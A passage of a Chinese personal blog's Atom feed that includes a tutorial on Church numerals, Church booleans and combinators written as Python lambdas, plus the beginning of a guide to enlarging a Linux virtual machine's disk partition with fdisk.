/><p>支持bw和bwr，灰度三种显示模式。</p><p>这个项目开源放在了<a href="https://github.com/ihopenot/ihopebleepd">https://github.com/ihopenot/ihopebleepd</a></p><p>局刷也能搞，把清空的波形去掉就行了，懒得搞了，反正只是显示图片。</p><p>低功耗不会搞（，现在得经常把电池拔拔插插来省电（</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;去年就买了几个墨水屏，本来打算玩的，但是一直抽不出时间（懒）。最近稍微闲下来点，来研究下墨水屏。&lt;/p&gt;
&lt;p&gt;一开始捡的闲鱼2.13寸的黑白屏，7块钱一个。但是这个不支持蓝牙，玩了一下又入了一批支持蓝牙的版本，无线刷图还是要舒服一些的。&lt;/p&gt;
&lt;h1 id=&quot;第一批墨水屏&quot;&gt;&lt;a href=&quot;#第一批墨水屏&quot; class=&quot;headerlink&quot; title=&quot;第一批墨水屏&quot;&gt;&lt;/a&gt;第一批墨水屏&lt;/h1&gt;&lt;p&gt;这批墨水屏是Stellar-M型号的，一开始看了很多资料，感觉可搞才入的，但是后来到手才发现屏和主流的Stellar-M不太一样。&lt;/p&gt;
&lt;p&gt;拆解和烧录程序参考&lt;a href=&quot;https://www.bilibili.com/read/cv21954945/&quot;&gt;这篇文章&lt;/a&gt;，这篇文章写的挺好，整个的操作基本是按照这篇文章走的。&lt;/p&gt;
&lt;p&gt;汉朔的电池都是类似的拆法，拿螺丝刀抵住后面的卡扣往上翘就行，很容易拆下来。前面板是胶封的，得拿小刀从旁边小心的撬。&lt;/p&gt;
&lt;p&gt;拆下来看，板子的主控是MSP430G2553，屏是WF0213T5PBZ08230H。&lt;/p&gt;
&lt;p&gt;这个屏型号具体信息网上也搜不到，&lt;a href=&quot;https://github.com/CursedHardware/epd-datasheet&quot;&gt;这个仓库&lt;/a&gt;里有类似型号的信息，但也不多，应该是&lt;a href=&quot;http://www.wf-tech.com/&quot;&gt;WF-Tech无锡威峰&lt;/a&gt;的屏。&lt;/p&gt;
&lt;p&gt;板子拆出来之后用串口怼上去，我用的CH340G，接线方法参考上面那篇文章。理想情况是可以只拆电池然后接调试口刷的，但是用串口刷的话要从pcb前面飞线，所以一定得把板子拆下来。&lt;/p&gt;</summary>
    
    
    
    
    <category term="IOT" scheme="https://ihopenot.github.io/tags/IOT/"/>
    
  </entry>
  
  <entry>
    <title>ChurchNumber和函数式初探</title>
    <link href="https://ihopenot.github.io/2023/04/02/ChurchNumber%E5%92%8C%E5%87%BD%E6%95%B0%E5%BC%8F%E5%88%9D%E6%8E%A2/"/>
    <id>https://ihopenot.github.io/2023/04/02/ChurchNumber%E5%92%8C%E5%87%BD%E6%95%B0%E5%BC%8F%E5%88%9D%E6%8E%A2/</id>
    <published>2023-04-02T06:45:54.000Z</published>
    <updated>2023-08-24T14:35:04.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>挺早就在ctf里见到有关lambda表达式来出题，当时啥也不懂，就xjb调一调，弄一弄，猜一猜还真给做出来了。大概之后又过了几个月又见到lambda的题了，那次好好研究了一下，最后做出来了，也感受到了函数式编程的妙，以及了解了邱奇数和邱奇布尔值的一些知识，当时很自信，感觉会了。然后再xctf上就被lambda revenge暴打了，看了一天没做出来，赛后放源码看了看，发现自己还是太naive，这里稍微做些总结，免得下次再有lambda的题到处去搜表达式。</p><p>因为lambda表达式有很多种写法，这里统一使用python代码作为表示形式，感觉比较工程。</p><h1 id="函数式编程"><a href="#函数式编程" class="headerlink" title="函数式编程"></a>函数式编程</h1><p>在函数式编程的世界里，函数被视为一等公民。这一概念在许多地方都能看到，所以不再赘述。从我自己的感受来说，函数式编程中的所有事物都可以看作是一个过程，或者也可以称之为函数。只有当我们向这个函数传入具体的参数时，这个过程才会产生一个结果。</p><p>在函数式编程中，一个函数的输入和输出都可能是另一个函数。这使得复杂的过程可以被拆分成简单函数的组合。换句话说，一个复杂的功能函数可以被拆分成许多底层的简单函数。整个过程在传入具体值之前可能没有实际意义，又或者根据传入的函数不同会有不同的功能。这种拆分和组合为函数式编程带来了强大的表达能力和灵活性。</p><span id="more"></span><h2 id="柯里化"><a href="#柯里化" class="headerlink" title="柯里化"></a>柯里化</h2><p>柯里化是一种把函数标准化的方式，有的函数可能接收很多参数，柯里化就是将这种接收很多参数的函数变为接收一个参数的函数。</p><p>例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 未柯里化</span></span><br><span class="line">add = <span class="keyword">lambda</span> x, y: x+y</span><br><span class="line"><span class="keyword">assert</span> add(<span class="number">1</span>, <span class="number">2</span>) == <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 柯里化</span></span><br><span class="line">add_k = <span class="keyword">lambda</span> x: <span class="keyword">lambda</span> y: x+y</span><br><span class="line"><span class="keyword">assert</span> add(<span class="number">1</span>)(<span class="number">2</span>) == <span class="number">3</span></span><br></pre></td></tr></table></figure><p>add函数是一个接收两个参数的函数，柯里化后的add_k函数是接收一个参数的函数。实际上add_k在接收到第一个参数后会返回一个<em>接收一个参数的函数</em>，这个时候再将第二个参数传入才会最终执行加法。</p><p>柯里化之后的lambda表达式更容易处理，下文的所有式子也都是柯里化后的表达式。</p><h1 id="ChurchNumber"><a href="#ChurchNumber" class="headerlink" title="ChurchNumber"></a>ChurchNumber</h1><h2 id="邱奇数"><a href="#邱奇数" class="headerlink" title="邱奇数"></a>邱奇数</h2><p>邱奇数是定义在函数上的一类数，它本身也是一个函数，可以传入参数。</p><p>邱奇数的前几个数定义如下：</p><p><code>ZERO = lambda f: lambda x: x</code></p><p><code>ONE = lambda f: lambda x: f(x)</code></p><p><code>TWO = lambda f: lambda x: f(f(x))</code></p><p>简单来说，如果<code>x</code>外部套<code>c</code>了层<code>f</code>，这个表达式对应的数字就是<code>c</code>。</p><p>可以使用函数来将邱奇数转换成对应的整数，只要传入<code>f = lambda n: n+1</code>和<code>x = 0</code>，代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">f = <span class="keyword">lambda</span> n: n+<span class="number">1</span></span><br><span class="line">x = <span class="number">0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">to_num</span>(<span class="params">church</span>):</span><br><span class="line">    <span class="keyword">return</span> church(f)(x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> to_num(ZERO) == <span class="number">0</span></span><br><span class="line"><span class="keyword">assert</span> to_num(ONE) == <span class="number">1</span></span><br><span class="line"><span class="keyword">assert</span> to_num(TWO) == <span class="number">2</span></span><br></pre></td></tr></table></figure><h2 id="邱奇数的运算"><a href="#邱奇数的运算" class="headerlink" title="邱奇数的运算"></a>邱奇数的运算</h2><p>有了数的定义，接下来是一些运算的定义：</p><p>后继： <code>SUCC = lambda n: lambda f: lambda x: f(n(f)(x)) </code></p><p>这个式子相当于再<code>n</code>外面再套了一层<code>f</code>，所以结果是<code>n+1</code>。</p><p>加法：<code>ADD = lambda n: lambda m: lambda f: lambda x: m(f)(n(f)(x))</code></p><p>这个式子相当于把<code>m</code>最里面的<code>x</code>替换成了<code>n</code>，所以结果是<code>n+m</code>。</p><p>乘法：<code>MUL = lambda n: lambda m: lambda f: lambda x: m(n(f))(x)</code></p><p>这个式子相当于把<code>m</code>里面的<code>f</code>替换成了<code>n</code>个<code>f</code>，所以结果是<code>n*m</code>。</p><p>指数：<code>EXP = lambda n: lambda m: lambda f: lambda x: n(m)(f)(x)</code></p><p>这个式子稍微化一下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lambda n: lambda m: lambda f: lambda x: n(m)(f)(x)</span><br><span class="line">=&gt; lambda n: lambda m: lambda f: lambda x: (n(m)(f))(x)// 将m和f带入n</span><br><span class="line">=&gt; lambda n: lambda m: lambda f: lambda x: m(m(...m(f)))(x) // n个m</span><br><span class="line">=&gt; lambda n: lambda m: lambda f: lambda x: MUL(m, MUL(m, ...))(x) // 根据乘法规则化简</span><br></pre></td></tr></table></figure><p>所以结果是<code>m**n</code></p><p>前驱：<code>PRED = lambda n: lambda f: lambda x: n(lambda g: lambda h: h(g(f)))(lambda h: x)(lambda h: h)</code></p><p>好像没啥简便的证法，最后结果是<code>n-1</code>。需要注意的是<code>PRED(ZERO)</code>结果还是<code>ZERO</code>。</p><p>减法：<code>SUB = lambda n: lambda m: n(PRED)(m)</code></p><p>一种naive的想法是直接运行<code>n</code>次<code>PRED</code>，由于church数的定义就是将<code>f</code>运行<code>n</code>次，所以<code>m-n</code>可以简单地定义为<code>n(PRED)(m)</code>，同理，当<code>m-n&lt;0</code>的时候会返回<code>ZERO</code>。</p><p>除法：太复杂了。。</p><h2 id="邱奇布尔值"><a href="#邱奇布尔值" class="headerlink" title="邱奇布尔值"></a>邱奇布尔值</h2><p>简单定义一下<code>True</code>和<code>False</code></p><p><code>TRUE = lambda x: lambda y: x</code></p><p><code>FALSE = lambda x: lambda y: y</code></p><p><code>True</code>和<code>False</code>区别在于选择第一个参数还是第二个参数。</p><h2 id="邱奇布尔值的运算"><a href="#邱奇布尔值的运算" class="headerlink" title="邱奇布尔值的运算"></a>邱奇布尔值的运算</h2><p>与：<code>AND = lambda x: lambda y: x(y)(x)</code></p><p>如果<code>x</code>为真则返回<code>y</code>，否则返回<code>x</code>，所以结果是<code>x and y</code>。</p><p>或：<code>OR = lambda x: lambda y: x(x)(y)</code></p><p>如果<code>x</code>为真则返回<code>x</code>，否则返回<code>y</code>，所以结果是<code>x or y</code>。</p><p>非：<code>NOT = lambda x: x(FALSE)(TRUE)</code> 或者 <code>NOT = lambda n: lambda x: lambda y: n(y)(x)</code></p><p>条件判断：<code>IF = lambda n: lambda x: lambda y: n(x)(y)</code></p><p>如果<code>n</code>为真则返回<code>x</code>，否则返回<code>y</code>。</p><p>布尔运算相对简单，也很容易推导。</p><h2 id="函数式运算"><a href="#函数式运算" class="headerlink" title="函数式运算"></a>函数式运算</h2><p>这一部分相当杂项，而且很多定义也并不唯一。</p><h3 id="IsZero"><a href="#IsZero" class="headerlink" title="IsZero"></a>IsZero</h3><p>永假表达式：<code>ALWAYS_FALSE = lambda x: FALSE</code></p><p>判断是否为0：<code>ISZERO = lambda n: n(ALWAYS_FALSE)(TRUE)</code></p><p>只有当<code>n == ZERO</code>的时候<code>ISZERO</code>会返回<code>TRUE</code>。</p><h3 id="Pair"><a href="#Pair" class="headerlink" title="Pair"></a>Pair</h3><p>定义pair：<code>PAIR = lambda x: lambda y: lambda b: b(x)(y)</code></p><p><code>PAIR</code>操作定义了一个二元组，首先传入二元组中的两个元素<code>x</code>和<code>y</code>，之后根据传入的<code>b</code>决定返回<code>x</code>还是<code>y</code>。</p><p>有了<code>PAIR</code>我们可以继续定义<code>FIRST</code>和<code>SECOND</code>操作，分别对应从pair中取出第一个元素和第二个元素。</p><p>first操作：<code>FIRST = lambda p: p(TRUE)</code></p><p>first操作：<code>SECOND = lambda p: p(FALSE)</code></p><p>用法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p = PAIR(ONE)(TWO)</span><br><span class="line"><span class="keyword">assert</span> FIRST(p) == ONE</span><br><span class="line"><span class="keyword">assert</span> SECOND(p) == TWO</span><br></pre></td></tr></table></figure><h3 id="List"><a href="#List" class="headerlink" title="List"></a>List</h3><p>接下来定义list，list是一个pair的嵌套，以Null结尾。</p><p>为了定义list，我们先要定义Null和判断是否为Null。</p><p>Null：<code>NULL = lambda x: TRUE</code></p><p>判断是否为Null：<code>ISNULL = lambda v: v(lambda x: lambda y: FALSE)</code></p><p>判断是否为Null只能在list中使用，更准确的说，传入的<code>v</code>必须是<code>NULL</code>或者是<em>接收两个参数的函数</em>。</p><h3 id="另一种减法"><a href="#另一种减法" class="headerlink" title="另一种减法"></a>另一种减法</h3><p>使用pair实现pred操作，需要首先定义一个函数next。</p><p>next：<code>_NEXT = lambda x: PAIR(SECOND(x))(SUCC(SECOND(x)))</code></p><p>如果传入的是<code>(x-1, x)</code>则会返回<code>(x, x+1)</code>。</p><p>在这个基础上实现的pred操作。</p><p>pred：<code>_PRED = lambda n: FIRST(n(_NEXT)(PAIR(ZERO)(ZERO))) </code></p><p>由于church数的定义，<code>n(_NEXT)(PAIR(ZERO)(ZERO))</code>实际上就是在<code>(0, 0)</code>的基础上调用<code>n</code>次<code>_NEXT</code>，所以最后<code>FIRST</code>出来的结果就是<code>n-1</code>。</p><p>与church数的减法类似，也可以定义新的减法操作。</p><p>sub：<code>_SUB = lambda n: lambda m: n(_PRED)(m)</code></p><p>结果为<code>m-n</code>。</p><h3 id="IsEqual"><a href="#IsEqual" class="headerlink" title="IsEqual"></a>IsEqual</h3><p>判断相等：<code>EQ = lambda n: lambdam: AND(ISZERO(SUB(n)(m)))(ISZERO(SUB(m)(n)))</code></p><h3 id="Y-Combinator"><a href="#Y-Combinator" class="headerlink" title="Y Combinator"></a>Y Combinator</h3><p>Y Combinator：<code>YCOMB = lambda f: (lambda x: f(x(x)))(lambda x: f(x(x))) </code></p><p>可以用来实现递归。</p><p>示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">fib = <span class="keyword">lambda</span> f: <span class="keyword">lambda</span> n: n <span class="keyword">if</span> n &lt; <span class="number">2</span> <span class="keyword">else</span> f(n-<span class="number">1</span>) + f(n-<span class="number">2</span>)</span><br><span class="line"><span class="keyword">assert</span> YCOMB(fib)(<span class="number">7</span>) == <span class="number">13</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 简单证明</span></span><br><span class="line"><span class="comment"># YCOMB(FUNC) = (lambda x: FUNC(x(x)))(lambda x: FUNC(x(x)))</span></span><br><span class="line"><span class="comment"># =&gt; FUNC(lambda x: FUNC(x(x)))(lambda x: FUNC(x(x)))</span></span><br><span class="line"><span class="comment">#=&gt; FUNC(YCOMB(FUNC))</span></span><br><span class="line"><span class="comment"># 代入YCOMB(fib)(7)可以理解的更深一些</span></span><br></pre></td></tr></table></figure><p>上面这个东西在python里跑会直接爆栈，可能是python求值策略导致无限展开了。</p><p>不过有个替代品<code>ZCOMP</code>可以用：<code>ZCOMP = lambda f: (lambda x: (lambda m: f(x(x))(m)))(lambda x: (lambda m: f(x(x))(m)))</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">assert</span> ZCOMP(fib)(<span class="number">7</span>) == <span class="number">13</span></span><br></pre></td></tr></table></figure><p>可以使用递归和<code>ISNULL</code>判断来实现list遍历。</p><h1 id="总表"><a href="#总表" class="headerlink" title="总表"></a>总表</h1><p>一键导入lambda函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">ZERO = <span class="keyword">lambda</span> f: <span class="keyword">lambda</span> x: x</span><br><span class="line">SUCC = <span class="keyword">lambda</span> n: <span class="keyword">lambda</span> f: <span class="keyword">lambda</span> x: f(n(f)(x))</span><br><span class="line">ADD = <span class="keyword">lambda</span> n: <span class="keyword">lambda</span> m: <span class="keyword">lambda</span> f: <span class="keyword">lambda</span> x: m(f)(n(f)(x))</span><br><span class="line">MUL = <span class="keyword">lambda</span> n: <span class="keyword">lambda</span> m: <span class="keyword">lambda</span> f: <span class="keyword">lambda</span> x: m(n(f))(x)</span><br><span class="line">EXP = <span class="keyword">lambda</span> n: <span class="keyword">lambda</span> m: <span class="keyword">lambda</span> f: <span class="keyword">lambda</span> x: n(m)(f)(x)</span><br><span class="line">PRED = <span class="keyword">lambda</span> n: <span class="keyword">lambda</span> f: <span class="keyword">lambda</span> x: n(<span class="keyword">lambda</span> g: <span class="keyword">lambda</span> h: h(g(f)))(<span class="keyword">lambda</span> h: x)(<span class="keyword">lambda</span> h: h)</span><br><span class="line">SUB = <span class="keyword">lambda</span> n: <span class="keyword">lambda</span> m: n(PRED)(m)</span><br><span class="line"></span><br><span class="line">TRUE = <span class="keyword">lambda</span> x: <span class="keyword">lambda</span> y: x</span><br><span class="line">FALSE = <span class="keyword">lambda</span> x: <span class="keyword">lambda</span> y: y</span><br><span class="line">AND = <span class="keyword">lambda</span> x: <span class="keyword">lambda</span> y: x(y)(x)</span><br><span class="line">OR = <span class="keyword">lambda</span> x: <span class="keyword">lambda</span> y: x(x)(y)</span><br><span class="line">NOT = <span class="keyword">lambda</span> n: <span class="keyword">lambda</span> x: <span class="keyword">lambda</span> y: n(y)(x)</span><br><span class="line">IF = <span class="keyword">lambda</span> n: <span class="keyword">lambda</span> x: <span class="keyword">lambda</span> y: n(x)(y)</span><br><span class="line"></span><br><span class="line">ALWAYS_FALSE = <span class="keyword">lambda</span> x: FALSE</span><br><span class="line">ISZERO = <span class="keyword">lambda</span> n: n(ALWAYS_FALSE)(TRUE)</span><br><span class="line"></span><br><span class="line">PAIR = <span class="keyword">lambda</span> x: <span class="keyword">lambda</span> y: <span class="keyword">lambda</span> b: b(x)(y)</span><br><span class="line">FIRST = <span class="keyword">lambda</span> p: p(TRUE)</span><br><span class="line">SECOND = <span class="keyword">lambda</span> p: p(FALSE)</span><br><span class="line"></span><br><span class="line">NULL = <span class="keyword">lambda</span> x: TRUE</span><br><span class="line">ISNULL = <span class="keyword">lambda</span> v: v(<span class="keyword">lambda</span> x: <span class="keyword">lambda</span> y: FALSE)</span><br><span class="line"></span><br><span class="line">_NEXT = <span class="keyword">lambda</span> x: PAIR(SECOND(x))(SUCC(SECOND(x)))</span><br><span class="line">_PRED = <span class="keyword">lambda</span> n: FIRST(n(_NEXT)(PAIR(ZERO)(ZERO)))</span><br><span class="line">_SUB = <span class="keyword">lambda</span> n: <span class="keyword">lambda</span> m: n(_PRED)(m)</span><br><span class="line"></span><br><span class="line">EQ = <span class="keyword">lambda</span> n: lambdam: AND(ISZERO(SUB(n)(m)))(ISZERO(SUB(m)(n)))</span><br><span class="line">YCOMB = <span class="keyword">lambda</span> f: (<span class="keyword">lambda</span> x: f(x(x)))(<span class="keyword">lambda</span> x: f(x(x)))</span><br><span class="line">ZCOMP = <span class="keyword">lambda</span> f: (<span class="keyword">lambda</span> x: (<span class="keyword">lambda</span> m: f(x(x))(m)))(<span class="keyword">lambda</span> x: (<span class="keyword">lambda</span> m: f(x(x))(m)))</span><br><span class="line"></span><br><span class="line">TONUM_F = <span class="keyword">lambda</span> n: n+<span class="number">1</span></span><br><span class="line">TONUM_X = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">to_num</span>(<span class="params">n</span>):</span><br><span class="line"><span class="keyword">return</span> n(TONUM_F)(TONUM_X)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">church</span>(<span class="params">v: <span class="built_in">int</span></span>):</span><br><span class="line">ret = ZERO</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(v):</span><br><span class="line">ret = SUCC(ret)</span><br><span class="line"><span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> to_num(ZERO) == <span class="number">0</span></span><br><span class="line"><span class="keyword">assert</span> to_num(church(<span class="number">13</span>)) == <span class="number">13</span></span><br><span class="line"><span class="keyword">assert</span> to_num(ADD(church(<span class="number">12</span>))(church(<span class="number">7</span>))) == <span class="number">12</span>+<span class="number">7</span></span><br><span class="line"><span class="keyword">assert</span> to_num(MUL(church(<span class="number">12</span>))(church(<span class="number">7</span>))) == <span class="number">12</span>*<span class="number">7</span></span><br><span class="line"><span class="keyword">assert</span> to_num(EXP(church(<span class="number">3</span>))(church(<span class="number">6</span>))) == <span class="number">6</span>**<span class="number">3</span></span><br><span class="line"><span class="keyword">assert</span> to_num(PRED(church(<span class="number">25</span>))) == <span class="number">24</span></span><br><span class="line"><span class="keyword">assert</span> to_num(SUB(church(<span class="number">13</span>))(church(<span class="number">25</span>))) == <span class="number">25</span>-<span class="number">13</span></span><br><span class="line"><span class="keyword">assert</span> AND(TRUE)(FALSE) == FALSE</span><br><span class="line"><span class="keyword">assert</span> AND(TRUE)(TRUE) == TRUE</span><br><span class="line"><span class="keyword">assert</span> OR(TRUE)(FALSE) == TRUE</span><br><span class="line"><span class="keyword">assert</span> OR(FALSE)(FALSE) == FALSE</span><br><span class="line"><span class="keyword">assert</span> IF(TRUE)(<span class="number">1</span>)(<span class="number">0</span>) == <span class="number">1</span></span><br><span class="line"><span class="keyword">assert</span> IF(FALSE)(<span class="number">1</span>)(<span class="number">0</span>) == <span class="number">0</span></span><br><span class="line"><span class="keyword">assert</span> ISZERO(church(<span class="number">0</span>)) == TRUE</span><br><span class="line"><span class="keyword">assert</span> ISZERO(church(<span class="number">12</span>)) == FALSE</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;挺早就在ctf里见到有关lambda表达式来出题，当时啥也不懂，就xjb调一调，弄一弄，猜一猜还真给做出来了。大概之后又过了几个月又见到lambda的题了，那次好好研究了一下，最后做出来了，也感受到了函数式编程的妙，以及了解了邱奇数和邱奇布尔值的一些知识，当时很自信，感觉会了。然后再xctf上就被lambda revenge暴打了，看了一天没做出来，赛后放源码看了看，发现自己还是太naive，这里稍微做些总结，免得下次再有lambda的题到处去搜表达式。&lt;/p&gt;
&lt;p&gt;因为lambda表达式有很多种写法，这里统一使用python代码作为表示形式，感觉比较工程。&lt;/p&gt;
&lt;h1 id=&quot;函数式编程&quot;&gt;&lt;a href=&quot;#函数式编程&quot; class=&quot;headerlink&quot; title=&quot;函数式编程&quot;&gt;&lt;/a&gt;函数式编程&lt;/h1&gt;&lt;p&gt;在函数式编程的世界里，函数被视为一等公民。这一概念在许多地方都能看到，所以不再赘述。从我自己的感受来说，函数式编程中的所有事物都可以看作是一个过程，或者也可以称之为函数。只有当我们向这个函数传入具体的参数时，这个过程才会产生一个结果。&lt;/p&gt;
&lt;p&gt;在函数式编程中，一个函数的输入和输出都可能是另一个函数。这使得复杂的过程可以被拆分成简单函数的组合。换句话说，一个复杂的功能函数可以被拆分成许多底层的简单函数。整个过程在传入具体值之前可能没有实际意义，又或者根据传入的函数不同会有不同的功能。这种拆分和组合为函数式编程带来了强大的表达能力和灵活性。&lt;/p&gt;</summary>
    
    
    
    
    <category term="函数式编程" scheme="https://ihopenot.github.io/tags/%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>Linux虚拟机扩充硬盘</title>
    <link href="https://ihopenot.github.io/2023/03/12/Linux%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%89%A9%E5%85%85%E7%A1%AC%E7%9B%98/"/>
    <id>https://ihopenot.github.io/2023/03/12/Linux%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%89%A9%E5%85%85%E7%A1%AC%E7%9B%98/</id>
    <published>2023-03-12T13:24:54.000Z</published>
    <updated>2023-08-24T14:35:48.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>由于虚拟机硬盘经常被干满，就需要经常去加盘，每次加盘都要上网搜一下fdisk怎么用，很麻烦，因此，在这篇博客中我将总结一下这个过程，以便以后可以直接查阅。</p><h1 id="虚拟机硬盘扩充（fdisk）"><a href="#虚拟机硬盘扩充（fdisk）" class="headerlink" title="虚拟机硬盘扩充（fdisk）"></a>虚拟机硬盘扩充（fdisk）</h1><p>当虚拟机硬盘空间不足时，我们该如何处理？通常有两种选择：添加一块新硬盘或者增大原有硬盘的容量。</p><p>对于不使用LVM（逻辑卷管理）的情况，添加新硬盘并不容易直接扩展原始分区的容量。这对于像我这样将整个硬盘挂载在根目录（&#x2F;）下的用户来说并不友好。</p><p>因此，通常我们会选择增大原有硬盘的容量。这样一来，fdisk就可以识别到硬盘容量的增加。但是，由于分区表尚未修改，实际可用空间并不会有所变化。</p><p>接下来，我们将通过fdisk来扩大分区容量。</p><p><strong>数据无价，谨慎操作，如有重要信息，务必提前备份。</strong></p><span id="more"></span><h2 id="查看原始分区表信息"><a href="#查看原始分区表信息" class="headerlink" title="查看原始分区表信息"></a>查看原始分区表信息</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">ihopenot@ihopenot-virtual-machine:~$ sudo fdisk /dev/sda</span><br><span class="line"></span><br><span class="line">Welcome to fdisk (util-linux 2.34).</span><br><span class="line">Changes will remain in memory only, until you decide to write them.</span><br><span class="line">Be careful before using the write command.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Command (m for help): p</span><br><span class="line">Disk /dev/sda: 100 GiB, 107374182400 bytes, 209715200 sectors</span><br><span class="line">Disk model: Virtual disk    </span><br><span class="line">Units: sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line">Disklabel type: dos</span><br><span class="line">Disk identifier: 0x07ea7416</span><br><span class="line"></span><br><span class="line">Device     Boot   Start       End   Sectors  Size Id Type</span><br><span class="line">/dev/sda1  *       2048   1050623   1048576  512M  b W95 FAT32</span><br><span class="line">/dev/sda2       1052670 188741631 187688962 89.5G  5 Extended</span><br><span class="line">/dev/sda5       1052672 188741631 187688960 89.5G 83 Linux</span><br><span class="line"></span><br><span class="line">Command (m for help): F</span><br><span class="line">Unpartitioned space /dev/sda: 10 GiB, 10738466816 bytes, 20973568 sectors</span><br><span class="line">Units: sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line"></span><br><span class="line">    Start       End  Sectors Size</span><br><span class="line">188741632 209715199 20973568  10G</span><br></pre></td></tr></table></figure><p>使用<code>sudo fdisk /dev/*</code>来打开硬盘，p查看分区信息，F查看未分配的区域。</p><p>可以看到扩充的10个G是硬盘最末尾的区域。</p><p>如果sda5是primary分区的话可以直接删除sda5，再新建一个sda5将后面未分配的区域包括进来就行了。由于这里sda5是sda2扩展出来的逻辑分区，所以操作麻烦一点。另外，如果要扩展的分区不是最后一个的话会比较麻烦，可能需要将后面的分区先备份之后再扩展了。</p><h2 id="修改分区表"><a href="#修改分区表" class="headerlink" title="修改分区表"></a>修改分区表</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 